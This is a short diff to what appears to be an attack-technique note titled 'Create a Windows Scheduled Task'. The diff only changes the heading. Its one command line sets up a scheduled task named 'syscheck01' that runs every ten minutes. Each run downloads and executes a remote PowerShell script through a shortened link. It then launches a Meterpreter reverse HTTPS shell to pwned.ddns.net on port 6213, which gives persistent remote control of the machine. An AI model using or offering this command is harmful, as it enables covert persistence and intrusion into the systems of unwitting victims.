@@ -1,4 +1,4 @@
-# Create a Scheduled Task
+# Create a Windows Scheduled Task
 
 1) schtasks /create /tn syscheck01 /tr "powershell \"IEX (New-Object Net.WebClient).DownloadString(\\"\"http://bit.ly/2jMeXr2\\"\");Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost pwned.ddns.net -Lport 6213 -Force\"" /SC MINUTE /MO 10
 
